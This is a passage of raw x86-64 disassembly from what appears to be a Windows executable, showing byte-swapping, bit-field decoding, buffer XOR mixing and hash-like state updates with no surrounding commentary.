   14004f3b4:	cmp    rax,0x14
   14004f3b8:	je     0x14004f3d0
   14004f3ba:	mov    ecx,DWORD PTR [rbp+rax*1+0x848]
   14004f3c1:	bswap  ecx
   14004f3c3:	mov    DWORD PTR [rbp+rax*1+0xf80],ecx
   14004f3ca:	add    rax,0x4
   14004f3ce:	jmp    0x14004f3b4
   14004f3d0:	mov    rax,QWORD PTR [rbp+0x7e0]
   14004f3d7:	mov    QWORD PTR [rbp+0x1178],rax
   14004f3de:	mov    eax,r13d
   14004f3e1:	shr    eax,0x3
   14004f3e4:	and    eax,0x1f
   14004f3e7:	lea    rcx,[rax+rbp*1]
   14004f3eb:	add    rcx,0xf80
   14004f3f2:	xor    r8d,r8d
   14004f3f5:	xor    edx,edx
   14004f3f7:	xor    eax,eax
   14004f3f9:	cmp    r8,0x10
   14004f3fd:	je     0x14004f418
   14004f3ff:	shld   rax,rdx,0x8
   14004f404:	mov    r9,rdx
   14004f407:	shl    r9,0x8
   14004f40b:	movzx  edx,BYTE PTR [rcx+r8*1]
   14004f410:	inc    r8
   14004f413:	or     rdx,r9
   14004f416:	jmp    0x14004f3f9
   14004f418:	push   0xffffffffffffffff
   14004f41a:	pop    r8
   14004f41c:	mov    r9,r8
   14004f41f:	mov    r10,QWORD PTR [rbp+0x1178]
   14004f426:	mov    ecx,r10d
   14004f429:	shl    r9,cl
   14004f42c:	cmp    r10,0x40
   14004f430:	not    r9
   14004f433:	cmovae r9,r8
   14004f437:	and    r13d,0x7
   14004f43b:	lea    ecx,[r10+r13*1]
   14004f43f:	neg    cl
   14004f441:	shrd   rdx,rax,cl
   14004f445:	shr    rax,cl
   14004f448:	test   cl,0x40
   14004f44b:	cmove  rax,rdx
   14004f44f:	and    rax,r9
   14004f452:	mov    rbx,QWORD PTR [rbp+0x820]
   14004f459:	add    r10,0x7
   14004f45d:	bswap  rax
   14004f460:	shr    r10,0x3
   14004f464:	mov    QWORD PTR [rbp+0x500],rax
   14004f46b:	mov    r8,rbx
   14004f46e:	imul   r8,r10
   14004f472:	push   0x8
   14004f474:	pop    rcx
   14004f475:	sub    rcx,r10
   14004f478:	dec    r10
   14004f47b:	mov    rax,QWORD PTR [rbp+0x1158]
   14004f482:	lea    r11,[rax+r8*1]
   14004f486:	mov    rax,r8
   14004f489:	xor    edx,edx
   14004f48b:	push   0x14
   14004f48d:	pop    rsi
   14004f48e:	div    rsi
   14004f491:	cmp    rcx,0x8
   14004f495:	je     0x14004f4bb
   14004f497:	cmp    r10,0x7
   14004f49b:	ja     0x140059d80
   14004f4a1:	imul   rax,rax,0xffffffffffffffec
   14004f4a5:	mov    al,BYTE PTR [r11+rax*1]
   14004f4a9:	xor    BYTE PTR [rbp+rcx*1+0x500],al
   14004f4b0:	inc    rcx
   14004f4b3:	inc    r11
   14004f4b6:	inc    r8
   14004f4b9:	jmp    0x14004f486
   14004f4bb:	mov    rdx,QWORD PTR [rbp+0x500]
   14004f4c2:	bswap  rdx
   14004f4c5:	and    rdx,r9
   14004f4c8:	inc    rbx
   14004f4cb:	mov    QWORD PTR [rbp+0x820],rbx
   14004f4d2:	mov    r13,QWORD PTR [rbp+0x890]
   14004f4d9:	mov    rsi,QWORD PTR [rbp+0x888]
   14004f4e0:	mov    rdi,QWORD PTR [rbp+0x880]
   14004f4e7:	mov    r12,QWORD PTR [rbp+0x870]
   14004f4ee:	mov    r14,QWORD PTR [rbp+0x878]
   14004f4f5:	mov    rax,r13
   14004f4f8:	sub    rax,rsi
   14004f4fb:	sub    rax,rdi
   14004f4fe:	mov    r8,QWORD PTR [rbp+0x1178]
   14004f505:	cmp    rax,r8
   14004f508:	cmovae rax,r8
   14004f50c:	cmp    rax,0x1
   14004f510:	adc    rax,0x0
   14004f514:	mov    ecx,r8d
   14004f517:	sub    ecx,eax
   14004f519:	and    cl,0x3f
   14004f51c:	cmp    r8,rax
   14004f51f:	movzx  ecx,cl
   14004f522:	mov    r8d,0x0
   14004f528:	cmovbe ecx,r8d
   14004f52c:	shr    rdx,cl
   14004f52f:	mov    ecx,eax
   14004f531:	shld   r14,r12,cl
   14004f535:	shl    r12,cl
   14004f538:	test   al,0x40
   14004f53a:	cmovne r14,r12
   14004f53e:	mov    ecx,0x0
   14004f543:	cmove  rcx,r12
   14004f547:	or     rcx,rdx
   14004f54a:	mov    QWORD PTR [rbp+0x878],r14
   14004f551:	mov    QWORD PTR [rbp+0x870],rcx
   14004f558:	add    rdi,rax
   14004f55b:	mov    QWORD PTR [rbp+0x880],rdi
   14004f562:	mov    r12,rcx
   14004f565:	jmp    0x14004f00d
   14004f56a:	add    rdi,0xfffffffffffffff8
   14004f56e:	mov    rax,r12
   14004f571:	mov    ecx,edi
   14004f573:	shrd   rax,r14,cl
   14004f577:	mov    rdx,r14
   14004f57a:	shr    rdx,cl
   14004f57d:	push   0xffffffffffffffff
   14004f57f:	pop    r9
   14004f581:	mov    r8,r9
   14004f584:	shl    r8,cl
   14004f587:	test   dil,0x40
   14004f58b:	cmove  rdx,rax
   14004f58f:	mov    rax,r9
   14004f592:	cmovne rax,r8
   14004f596:	mov    ecx,0x0
   14004f59b:	cmove  rcx,r8
   14004f59f:	mov    QWORD PTR [rbp+0x880],rdi
   14004f5a6:	not    rcx
   14004f5a9:	not    rax
   14004f5ac:	and    rax,r14
   14004f5af:	and    rcx,r12
   14004f5b2:	test   rdi,rdi
   14004f5b5:	cmove  rcx,rdi
   14004f5b9:	cmove  rax,rdi
   14004f5bd:	mov    QWORD PTR [rbp+0x878],rax
   14004f5c4:	mov    QWORD PTR [rbp+0x870],rcx
   14004f5cb:	add    rsi,0x8
   14004f5cf:	mov    QWORD PTR [rbp+0x888],rsi
   14004f5d6:	mov    r12,rcx
   14004f5d9:	mov    r14,rax
   14004f5dc:	inc    r15
   14004f5df:	lea    rcx,[rbp+0xcc0]
   14004f5e6:	call   0x14003c141
   14004f5eb:	jmp    0x14004eff0
   14004f5f0:	mov    rcx,QWORD PTR [rbp+0xcc0]
   14004f5f7:	mov    rdx,QWORD PTR [rbp+0xcc8]
   14004f5fe:	call   0x14006f7f7
   14004f603:	mov    ecx,0xc8
   14004f608:	lea    rdi,[rbp+0x408]
   14004f60f:	lea    rsi,[rbp+0x7d8]
   14004f616:	rep movs BYTE PTR [rdi],BYTE PTR [rsi]
   14004f618:	mov    rax,QWORD PTR [rbp+0x1180]
   14004f61f:	mov    QWORD PTR [rbp+0x400],rax
   14004f626:	movups XMMWORD PTR [rbp+0x398],xmm6
   14004f62d:	mov    DWORD PTR [rbp+0x3a8],0xbc648de3
   14004f637:	xor    ecx,ecx
   14004f639:	xor    ebx,ebx
   14004f63b:	mov    QWORD PTR [rbp+0x390],rcx
   14004f642:	cmp    rbx,QWORD PTR [rbp+0x1138]
   14004f649:	je     0x14005028e
   14004f64f:	mov    r8,QWORD PTR [rbp+0x348]
   14004f656:	mov    r9,QWORD PTR [rbp+0x350]
   14004f65d:	lea    rax,[r8+0x8]
   14004f661:	xor    r15d,r15d
   14004f664:	cmp    rax,r9
   14004f667:	ja     0x14004fc40
   14004f66d:	mov    rax,QWORD PTR [rbp+0x340]
   14004f674:	cmp    rax,0x8
   14004f678:	jae    0x14004fbcc
   14004f67e:	mov    rcx,QWORD PTR [rbp+0x2e0]
   14004f685:	cmp    rcx,QWORD PTR [rbp+0x2e8]
   14004f68c:	jae    0x14004f6d4
   14004f68e:	mov    rcx,QWORD PTR [rbp+0x298]
   14004f695:	mov    rdx,QWORD PTR [rbp+0x2d8]
   14004f69c:	cmp    rdx,rcx
   14004f69f:	jae    0x14004f6d4
   14004f6a1:	mov    rax,QWORD PTR [rbp+0x1170]
   14004f6a8:	movzx  r15d,BYTE PTR [rax+rdx*1]
   14004f6ad:	and    r15d,0x7f
   14004f6b1:	inc    rdx
   14004f6b4:	cmp    rdx,rcx
   14004f6b7:	jae    0x14004f6df
   14004f6b9:	mov    rax,QWORD PTR [rbp+0x1170]
   14004f6c0:	movzx  eax,BYTE PTR [rax+rdx*1]
   14004f6c4:	test   al,al
   14004f6c6:	jns    0x14004f6dc
   14004f6c8:	shl    r15,0x7
   14004f6cc:	and    eax,0x7f
   14004f6cf:	or     r15,rax
   14004f6d2:	jmp    0x14004f6b1
   14004f6d4:	xor    r11d,r11d
   14004f6d7:	jmp    0x14004fb48
   14004f6dc:	mov    rcx,rdx
   14004f6df:	mov    QWORD PTR [rbp+0x2d8],rcx
   14004f6e6:	mov    rax,r15
   14004f6e9:	shr    rax,0x8
   14004f6ed:	mov    rsi,r15
   14004f6f0:	shr    rsi,0x28
   14004f6f4:	movaps XMMWORD PTR [rbp+0x1090],xmm7
   14004f6fb:	movaps XMMWORD PTR [rbp+0x1080],xmm7
   14004f702:	movaps XMMWORD PTR [rbp+0x1070],xmm7
   14004f709:	movaps XMMWORD PTR [rbp+0x1060],xmm7
   14004f710:	mov    DWORD PTR [rbp+0x7d0],eax
   14004f716:	lea    rax,[rip+0x3893b]        # 0x140088058
   14004f71d:	mov    QWORD PTR [rsp+0x20],rax
   14004f722:	lea    rcx,[rbp+0x1060]
   14004f729:	push   0x4
   14004f72b:	pop    rdx
   14004f72c:	lea    r8,[rbp+0x7d0]
   14004f733:	mov    r9,rdx
   14004f736:	call   0x1400638fe
   14004f73b:	mov    BYTE PTR [rbp+0x1064],sil
   14004f742:	mov    rsi,QWORD PTR [rbp+0x2b0]
   14004f749:	cmp    QWORD PTR [rbp+0x2f8],rsi
   14004f750:	jbe    0x14004f87c
   14004f756:	mov    r9,QWORD PTR [rbp+0x2b8]
   14004f75d:	cmp    r9,0x4
   14004f761:	ja     0x140059d9c
   14004f767:	mov    rcx,QWORD PTR [rbp+0x2c0]
   14004f76e:	cmp    rcx,0x5
   14004f772:	jae    0x140059dae
   14004f778:	mov    r14,QWORD PTR [rbp+0x2f8]
   14004f77f:	cmp    r14,rsi
   14004f782:	je     0x140059dbc
   14004f788:	mov    r8,r14
   14004f78b:	mov    eax,DWORD PTR [rbp+rcx*4+0x308]
   14004f792:	mov    cl,BYTE PTR [rbp+0x2c8]
   14004f798:	rol    eax,cl
   14004f79a:	sub    r8,rsi
   14004f79d:	xor    eax,DWORD PTR [rbp+r9*4+0x308]
   14004f7a5:	xor    edx,edx
   14004f7a7:	div    r8
   14004f7aa:	mov    rdi,rdx
   14004f7ad:	mov    rax,QWORD PTR [rbp+0x300]
   14004f7b4:	mov    QWORD PTR [rbp+0xd10],rax
   14004f7bb:	cmp    rsi,0x40
   14004f7bf:	push   0x40
   14004f7c1:	pop    rax
   14004f7c2:	cmovae rsi,rax
   14004f7c6:	movaps XMMWORD PTR [rbp+0x800],xmm7
   14004f7cd:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   14004f7d4:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   14004f7db:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   14004f7e2:	lea    rcx,[rbp+0x7d0]
   14004f7e9:	mov    rdx,rsi
   14004f7ec:	call   0x14003c0b8
   14004f7f1:	test   r14,r14
   14004f7f4:	je     0x14004f842
   14004f7f6:	mov    rcx,rax
   14004f7f9:	mov    r8,rdx
   14004f7fc:	mov    rax,rdx
   14004f7ff:	add    rax,rdi
   14004f802:	mov    r9,QWORD PTR [rbp+0x2f0]
   14004f809:	cmp    rax,r14
   14004f80c:	jbe    0x14004f82c
   14004f80e:	xor    r10d,r10d
   14004f811:	cmp    r8,r10
   14004f814:	je     0x14004f842
   14004f816:	lea    rax,[r10+rdi*1]
   14004f81a:	xor    edx,edx
   14004f81c:	div    r14
   14004f81f:	mov    al,BYTE PTR [r9+rdx*1]
   14004f823:	mov    BYTE PTR [rcx+r10*1],al
   14004f827:	inc    r10
   14004f82a:	jmp    0x14004f811
   14004f82c:	add    r9,rdi
   14004f82f:	xor    eax,eax
   14004f831:	cmp    r8,rax
   14004f834:	je     0x14004f842
   14004f836:	mov    dl,BYTE PTR [r9+rax*1]
   14004f83a:	mov    BYTE PTR [rcx+rax*1],dl
   14004f83d:	inc    rax
   14004f840:	jmp    0x14004f831
   14004f842:	mov    rcx,QWORD PTR [rbp+0x2a8]
   14004f849:	xor    eax,eax
   14004f84b:	cmp    rsi,rax
   14004f84e:	je     0x14004f87c
   14004f850:	cmp    rcx,0x3f
   14004f854:	ja     0x140059d8e
   14004f85a:	mov    edx,eax
   14004f85c:	and    edx,0x7
   14004f85f:	mov    dl,BYTE PTR [rbp+rdx*1+0xd10]
   14004f866:	xor    dl,BYTE PTR [rbp+rax*1+0x7d0]
   14004f86d:	inc    rax
   14004f870:	mov    BYTE PTR [rbp+rcx*1+0x1060],dl
   14004f877:	inc    rcx
   14004f87a:	jmp    0x14004f84b
   14004f87c:	movaps XMMWORD PTR [rbp+0xd40],xmm7
   14004f883:	movaps XMMWORD PTR [rbp+0xd30],xmm7
   14004f88a:	movaps XMMWORD PTR [rbp+0xd20],xmm7
   14004f891:	movaps XMMWORD PTR [rbp+0xd10],xmm7
   14004f898:	xor    eax,eax
   14004f89a:	cmp    rax,0x40
   14004f89e:	je     0x14004f8b6
   14004f8a0:	mov    ecx,DWORD PTR [rbp+rax*1+0x1060]
   14004f8a7:	bswap  ecx
   14004f8a9:	mov    DWORD PTR [rbp+rax*1+0xd10],ecx
   14004f8b0:	add    rax,0x4
   14004f8b4:	jmp    0x14004f89a
   14004f8b6:	movups xmm0,XMMWORD PTR [rbp+0x308]
   14004f8bd:	mov    eax,DWORD PTR [rbp+0x318]
   14004f8c3:	movups XMMWORD PTR [rbp+0x7d0],xmm0
   14004f8ca:	mov    DWORD PTR [rbp+0x7e0],eax
   14004f8d0:	and    DWORD PTR [rbp+0x7e4],0x0
   14004f8d7:	movaps xmm0,XMMWORD PTR [rbp+0xd10]
   14004f8de:	movaps xmm1,XMMWORD PTR [rbp+0xd20]
   14004f8e5:	movaps xmm2,XMMWORD PTR [rbp+0xd30]
   14004f8ec:	movaps xmm3,XMMWORD PTR [rbp+0xd40]
   14004f8f3:	lea    rax,[rbp+0x7e8]
   14004f8fa:	movups XMMWORD PTR [rax+0x30],xmm3
   14004f8fe:	movups XMMWORD PTR [rax+0x20],xmm2
   14004f902:	movups XMMWORD PTR [rax+0x10],xmm1
   14004f906:	movups XMMWORD PTR [rax],xmm0
   14004f909:	call   0x140064214
   14004f90e:	mov    al,BYTE PTR [rip+0x49179]        # 0x140098a8d
   14004f914:	cmp    al,0x1
   14004f916:	je     0x14004f95f
   14004f918:	movzx  eax,al
   14004f91b:	cmp    eax,0x2
   14004f91e:	je     0x14004fa05
   14004f924:	and    DWORD PTR [rbp+0xf80],0x0
   14004f92b:	lea    rcx,[rip+0xfffffffffffb174e]        # 0x140001080
   14004f932:	mov    rdx,QWORD PTR [rbp+0x1150]
   14004f939:	push   0x40
   14004f93b:	pop    r8
   14004f93d:	lea    r9,[rbp+0xf80]
   14004f944:	call   QWORD PTR [rip+0x44ebe]        # 0x140094808
   14004f94a:	test   eax,eax
   14004f94c:	sete   cl
   14004f94f:	inc    cl
   14004f951:	mov    BYTE PTR [rip+0x49136],cl        # 0x140098a8d
   14004f957:	test   eax,eax
   14004f959:	je     0x14004fa05
   14004f95f:	mov    al,BYTE PTR [rip+0x49253]        # 0x140098bb8
   14004f965:	cmp    al,0x1
   14004f967:	je     0x14004f98c
   14004f969:	movzx  eax,al
   14004f96c:	test   eax,eax
   14004f96e:	jne    0x14004fa05
   14004f974:	call   0x140065d51
   14004f979:	test   rax,rax
   14004f97c:	sete   cl
   14004f97f:	inc    cl
   14004f981:	mov    BYTE PTR [rip+0x49231],cl        # 0x140098bb8
   14004f987:	test   rax,rax
   14004f98a:	je     0x14004fa05
   14004f98c:	call   0x140064227
   14004f991:	mov    eax,0xc8c291de
   14004f996:	xchg   DWORD PTR [rip+0x49144],eax        # 0x140098ae0
   14004f99c:	call   QWORD PTR [rip+0x44cae]        # 0x140094650
   14004f9a2:	mov    eax,eax
   14004f9a4:	mov    QWORD PTR [rip+0x48655],rax        # 0x140098000
   14004f9ab:	lea    rcx,[rbp+0x7d0]
   14004f9b2:	push   0xffffffffffffffff
   14004f9b4:	pop    rdx
   14004f9b5:	call   0x140010840
   14004f9ba:	xor    eax,eax
   14004f9bc:	xchg   DWORD PTR [rip+0x4911e],eax        # 0x140098ae0
   14004f9c2:	mov    BYTE PTR [rip+0x490c5],0x0        # 0x140098a8e
   14004f9c9:	mov    eax,DWORD PTR [rbp+0x7d0]
   14004f9cf:	add    DWORD PTR [rbp+0x308],eax
   14004f9d5:	mov    eax,DWORD PTR [rbp+0x7d4]
   14004f9db:	add    DWORD PTR [rbp+0x30c],eax
   14004f9e1:	mov    eax,DWORD PTR [rbp+0x7d8]
   14004f9e7:	add    DWORD PTR [rbp+0x310],eax
   14004f9ed:	mov    eax,DWORD PTR [rbp+0x7dc]
   14004f9f3:	add    DWORD PTR [rbp+0x314],eax
   14004f9f9:	mov    eax,DWORD PTR [rbp+0x7e0]
   14004f9ff:	add    DWORD PTR [rbp+0x318],eax
   14004fa05:	mov    BYTE PTR [rip+0x49080],0x0        # 0x140098a8c
   14004fa0c:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   14004fa13:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   14004fa1a:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   14004fa21:	xor    eax,eax
   14004fa23:	cmp    rax,0x14
   14004fa27:	je     0x14004fa3f
   14004fa29:	mov    ecx,DWORD PTR [rbp+rax*1+0x308]
   14004fa30:	bswap  ecx
   14004fa32:	mov    DWORD PTR [rbp+rax*1+0x7d0],ecx
   14004fa39:	add    rax,0x4
   14004fa3d:	jmp    0x14004fa23
   14004fa3f:	mov    r8,QWORD PTR [rbp+0x2a0]
   14004fa46:	mov    eax,r15d
   14004fa49:	shr    eax,0x3
   14004fa4c:	and    eax,0x1f
   14004fa4f:	lea    rcx,[rax+rbp*1]
   14004fa53:	add    rcx,0x7d0
   14004fa5a:	xor    r9d,r9d
   14004fa5d:	xor    edx,edx
   14004fa5f:	xor    eax,eax
   14004fa61:	cmp    r9,0x10
   14004fa65:	je     0x14004fa80
   14004fa67:	shld   rax,rdx,0x8
   14004fa6c:	mov    r10,rdx
   14004fa6f:	shl    r10,0x8
   14004fa73:	movzx  edx,BYTE PTR [rcx+r9*1]
   14004fa78:	inc    r9
   14004fa7b:	or     rdx,r10
   14004fa7e:	jmp    0x14004fa61
   14004fa80:	push   0xffffffffffffffff
   14004fa82:	pop    r9
   14004fa84:	mov    r10,r9
   14004fa87:	mov    ecx,r8d
   14004fa8a:	shl    r10,cl
   14004fa8d:	cmp    r8,0x40
   14004fa91:	not    r10
   14004fa94:	cmovae r10,r9
   14004fa98:	and    r15d,0x7
   14004fa9c:	lea    ecx,[r8+r15*1]
   14004faa0:	neg    cl
   14004faa2:	shrd   rdx,rax,cl
   14004faa6:	shr    rax,cl
   14004faa9:	test   cl,0x40
   14004faac:	cmove  rax,rdx
   14004fab0:	and    rax,r10
   14004fab3:	mov    rsi,QWORD PTR [rbp+0x2e0]
   14004faba:	add    r8,0x7
   14004fabe:	bswap  rax
   14004fac1:	shr    r8,0x3
   14004fac5:	mov    QWORD PTR [rbp+0xd10],rax
   14004facc:	mov    r9,rsi
   14004facf:	imul   r9,r8
   14004fad3:	push   0x8
   14004fad5:	pop    rcx
   14004fad6:	sub    rcx,r8
   14004fad9:	dec    r8
   14004fadc:	mov    rax,QWORD PTR [rbp+0x4d8]
   14004fae3:	lea    r11,[rax+r9*1]
   14004fae7:	mov    rax,r9
   14004faea:	xor    edx,edx
   14004faec:	push   0x14
   14004faee:	pop    rdi
   14004faef:	div    rdi
   14004faf2:	cmp    rcx,0x8
   14004faf6:	je     0x14004fb1c
   14004faf8:	cmp    r8,0x7
   14004fafc:	ja     0x140059d80
   14004fb02:	imul   rax,rax,0xffffffffffffffec
   14004fb06:	mov    al,BYTE PTR [r11+rax*1]
   14004fb0a:	xor    BYTE PTR [rbp+rcx*1+0xd10],al
   14004fb11:	inc    rcx
   14004fb14:	inc    r11
   14004fb17:	inc    r9
   14004fb1a:	jmp    0x14004fae7
   14004fb1c:	mov    r11,QWORD PTR [rbp+0xd10]
   14004fb23:	bswap  r11
   14004fb26:	and    r11,r10
   14004fb29:	inc    rsi
   14004fb2c:	mov    QWORD PTR [rbp+0x2e0],rsi
   14004fb33:	mov    r9,QWORD PTR [rbp+0x350]
   14004fb3a:	mov    rax,QWORD PTR [rbp+0x340]
   14004fb41:	mov    r8,QWORD PTR [rbp+0x348]
   14004fb48:	mov    rdx,r9
   14004fb4b:	sub    rdx,r8
   14004fb4e:	sub    rdx,rax
   14004fb51:	mov    rcx,QWORD PTR [rbp+0x2a0]
   14004fb58:	cmp    rdx,rcx
   14004fb5b:	cmovae rdx,rcx
   14004fb5f:	cmp    rdx,0x1
   14004fb63:	adc    rdx,0x0
   14004fb67:	mov    r10d,ecx
   14004fb6a:	sub    r10d,edx
   14004fb6d:	and    r10b,0x3f
   14004fb71:	cmp    rcx,rdx
   14004fb74:	movzx  ecx,r10b
   14004fb78:	mov    r10d,0x0
   14004fb7e:	cmovbe ecx,r10d
   14004fb82:	shr    r11,cl
   14004fb85:	mov    r10,QWORD PTR [rbp+0x330]
   14004fb8c:	mov    rsi,QWORD PTR [rbp+0x338]
   14004fb93:	mov    ecx,edx
   14004fb95:	shld   rsi,r10,cl
   14004fb99:	shl    r10,cl
   14004fb9c:	test   dl,0x40
   14004fb9f:	cmovne rsi,r10
   14004fba3:	mov    ecx,0x0
   14004fba8:	cmove  rcx,r10
   14004fbac:	or     rcx,r11
   14004fbaf:	mov    QWORD PTR [rbp+0x338],rsi
   14004fbb6:	mov    QWORD PTR [rbp+0x330],rcx
   14004fbbd:	add    rax,rdx
   14004fbc0:	mov    QWORD PTR [rbp+0x340],rax
   14004fbc7:	jmp    0x14004f674
   14004fbcc:	add    rax,0xfffffffffffffff8
   14004fbd0:	mov    QWORD PTR [rbp+0x340],rax
   14004fbd7:	mov    rdx,QWORD PTR [rbp+0x338]
   14004fbde:	mov    r9,rdx
   14004fbe1:	mov    ecx,eax
   14004fbe3:	shr    r9,cl
   14004fbe6:	mov    r10,QWORD PTR [rbp+0x330]
   14004fbed:	mov    r15,r10
   14004fbf0:	shrd   r15,rdx,cl
   14004fbf4:	push   0xffffffffffffffff
   14004fbf6:	pop    rsi
   14004fbf7:	mov    r11,rsi
   14004fbfa:	shl    r11,cl
   14004fbfd:	test   al,0x40
   14004fbff:	cmovne r15,r9
   14004fc03:	mov    ecx,0x0
   14004fc08:	cmove  rcx,r11
   14004fc0c:	cmove  r11,rsi
   14004fc10:	not    r11
   14004fc13:	not    rcx
   14004fc16:	and    rcx,r10
   14004fc19:	and    r11,rdx
   14004fc1c:	test   rax,rax
   14004fc1f:	cmove  r11,rax
   14004fc23:	cmove  rcx,rax
   14004fc27:	mov    QWORD PTR [rbp+0x330],rcx
   14004fc2e:	mov    QWORD PTR [rbp+0x338],r11
   14004fc35:	add    r8,0x8
   14004fc39:	mov    QWORD PTR [rbp+0x348],r8
   14004fc40:	mov    r8,QWORD PTR [rbp+0x4b8]
   14004fc47:	mov    r9,QWORD PTR [rbp+0x4c0]
   14004fc4e:	lea    rax,[r8+0x8]
   14004fc52:	cmp    rax,r9
   14004fc55:	ja     0x140050231
   14004fc5b:	mov    rax,QWORD PTR [rbp+0x4b0]
   14004fc62:	cmp    rax,0x8
   14004fc66:	jae    0x1400501ba
   14004fc6c:	mov    rcx,QWORD PTR [rbp+0x450]
   14004fc73:	cmp    rcx,QWORD PTR [rbp+0x458]
   14004fc7a:	jae    0x14004fcc2
   14004fc7c:	mov    rcx,QWORD PTR [rbp+0x408]
   14004fc83:	mov    rdx,QWORD PTR [rbp+0x448]
   14004fc8a:	cmp    rdx,rcx
   14004fc8d:	jae    0x14004fcc2
   14004fc8f:	mov    rax,QWORD PTR [rbp+0x1180]
   14004fc96:	movzx  r13d,BYTE PTR [rax+rdx*1]
   14004fc9b:	and    r13d,0x7f
   14004fc9f:	inc    rdx
   14004fca2:	cmp    rdx,rcx
   14004fca5:	jae    0x14004fccd
   14004fca7:	mov    rax,QWORD PTR [rbp+0x1180]
   14004fcae:	movzx  eax,BYTE PTR [rax+rdx*1]
   14004fcb2:	test   al,al
   14004fcb4:	jns    0x14004fcca
   14004fcb6:	shl    r13,0x7
   14004fcba:	and    eax,0x7f
   14004fcbd:	or     r13,rax
   14004fcc0:	jmp    0x14004fc9f
   14004fcc2:	xor    r11d,r11d
   14004fcc5:	jmp    0x140050136
   14004fcca:	mov    rcx,rdx
   14004fccd:	mov    QWORD PTR [rbp+0x448],rcx
   14004fcd4:	mov    rax,r13
   14004fcd7:	shr    rax,0x8
   14004fcdb:	mov    rsi,r13
   14004fcde:	shr    rsi,0x28
   14004fce2:	movaps XMMWORD PTR [rbp+0x1090],xmm7
   14004fce9:	movaps XMMWORD PTR [rbp+0x1080],xmm7
   14004fcf0:	movaps XMMWORD PTR [rbp+0x1070],xmm7
   14004fcf7:	movaps XMMWORD PTR [rbp+0x1060],xmm7
   14004fcfe:	mov    DWORD PTR [rbp+0x7d0],eax
   14004fd04:	lea    rax,[rip+0x3834d]        # 0x140088058
   14004fd0b:	mov    QWORD PTR [rsp+0x20],rax
   14004fd10:	lea    rcx,[rbp+0x1060]
   14004fd17:	push   0x4
   14004fd19:	pop    rdx
   14004fd1a:	lea    r8,[rbp+0x7d0]
   14004fd21:	mov    r9,rdx
   14004fd24:	call   0x1400638fe
   14004fd29:	mov    BYTE PTR [rbp+0x1064],sil
   14004fd30:	mov    rsi,QWORD PTR [rbp+0x420]
   14004fd37:	cmp    QWORD PTR [rbp+0x468],rsi
   14004fd3e:	jbe    0x14004fe6a
   14004fd44:	mov    r9,QWORD PTR [rbp+0x428]
   14004fd4b:	cmp    r9,0x4
   14004fd4f:	ja     0x140059d9c
   14004fd55:	mov    rcx,QWORD PTR [rbp+0x430]
   14004fd5c:	cmp    rcx,0x5
   14004fd60:	jae    0x140059dae
   14004fd66:	mov    r14,QWORD PTR [rbp+0x468]
   14004fd6d:	cmp    r14,rsi
   14004fd70:	je     0x140059dbc
   14004fd76:	mov    r8,r14
   14004fd79:	mov    eax,DWORD PTR [rbp+rcx*4+0x478]
   14004fd80:	mov    cl,BYTE PTR [rbp+0x438]
   14004fd86:	rol    eax,cl
   14004fd88:	sub    r8,rsi
   14004fd8b:	xor    eax,DWORD PTR [rbp+r9*4+0x478]
   14004fd93:	xor    edx,edx
   14004fd95:	div    r8
   14004fd98:	mov    rdi,rdx
   14004fd9b:	mov    rax,QWORD PTR [rbp+0x470]
   14004fda2:	mov    QWORD PTR [rbp+0xd10],rax
   14004fda9:	cmp    rsi,0x40
   14004fdad:	push   0x40
   14004fdaf:	pop    rax
   14004fdb0:	cmovae rsi,rax
   14004fdb4:	movaps XMMWORD PTR [rbp+0x800],xmm7
   14004fdbb:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   14004fdc2:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   14004fdc9:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   14004fdd0:	lea    rcx,[rbp+0x7d0]
   14004fdd7:	mov    rdx,rsi
   14004fdda:	call   0x14003c0b8
   14004fddf:	test   r14,r14
   14004fde2:	je     0x14004fe30
   14004fde4:	mov    rcx,rax
   14004fde7:	mov    r8,rdx
   14004fdea:	mov    rax,rdx
   14004fded:	add    rax,rdi
   14004fdf0:	mov    r9,QWORD PTR [rbp+0x460]
   14004fdf7:	cmp    rax,r14
   14004fdfa:	jbe    0x14004fe1a
   14004fdfc:	xor    r10d,r10d
   14004fdff:	cmp    r8,r10
   14004fe02:	je     0x14004fe30
   14004fe04:	lea    rax,[r10+rdi*1]
   14004fe08:	xor    edx,edx
   14004fe0a:	div    r14
   14004fe0d:	mov    al,BYTE PTR [r9+rdx*1]
   14004fe11:	mov    BYTE PTR [rcx+r10*1],al
   14004fe15:	inc    r10
   14004fe18:	jmp    0x14004fdff
   14004fe1a:	add    r9,rdi
   14004fe1d:	xor    eax,eax
   14004fe1f:	cmp    r8,rax
   14004fe22:	je     0x14004fe30
   14004fe24:	mov    dl,BYTE PTR [r9+rax*1]
   14004fe28:	mov    BYTE PTR [rcx+rax*1],dl
   14004fe2b:	inc    rax
   14004fe2e:	jmp    0x14004fe1f
   14004fe30:	mov    rcx,QWORD PTR [rbp+0x418]
   14004fe37:	xor    eax,eax
   14004fe39:	cmp    rsi,rax
   14004fe3c:	je     0x14004fe6a
   14004fe3e:	cmp    rcx,0x3f
   14004fe42:	ja     0x140059d8e
   14004fe48:	mov    edx,eax
   14004fe4a:	and    edx,0x7
   14004fe4d:	mov    dl,BYTE PTR [rbp+rdx*1+0xd10]
   14004fe54:	xor    dl,BYTE PTR [rbp+rax*1+0x7d0]
   14004fe5b:	inc    rax
   14004fe5e:	mov    BYTE PTR [rbp+rcx*1+0x1060],dl
   14004fe65:	inc    rcx
   14004fe68:	jmp    0x14004fe39
   14004fe6a:	movaps XMMWORD PTR [rbp+0xd40],xmm7
   14004fe71:	movaps XMMWORD PTR [rbp+0xd30],xmm7
   14004fe78:	movaps XMMWORD PTR [rbp+0xd20],xmm7
   14004fe7f:	movaps XMMWORD PTR [rbp+0xd10],xmm7
   14004fe86:	xor    eax,eax
   14004fe88:	cmp    rax,0x40
   14004fe8c:	je     0x14004fea4
   14004fe8e:	mov    ecx,DWORD PTR [rbp+rax*1+0x1060]
   14004fe95:	bswap  ecx
   14004fe97:	mov    DWORD PTR [rbp+rax*1+0xd10],ecx
   14004fe9e:	add    rax,0x4
   14004fea2:	jmp    0x14004fe88
   14004fea4:	movups xmm0,XMMWORD PTR [rbp+0x478]
